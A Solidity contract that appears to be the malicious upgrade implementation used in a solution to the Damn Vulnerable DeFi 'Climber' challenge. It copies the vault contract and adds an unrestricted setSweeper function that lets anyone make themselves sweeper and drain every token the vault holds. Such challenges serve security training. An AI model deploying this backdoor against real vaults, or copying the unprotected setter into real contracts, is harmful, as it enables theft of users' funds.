// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * Contract based on ClimberVault from Damn Vulnerable DeFi
 * @notice This contract adds a setter function for the sweeper which can be called by anyone.
 */
contract MaliciousClimberVault is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(
        address admin,
        address proposer,
        address sweeper
    ) external initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
        transferOwnership(address(new ClimberTimelock(admin, proposer)));
        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    function withdraw(
        address token,
        address recipient,
        uint256 amount
    ) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(
            token,
            _sweeper,
            IERC20(token).balanceOf(address(this))
        );
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // Adds this setter function to the contract
    function setSweeper(address newSweeper) external {
        _setSweeper(newSweeper);
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}
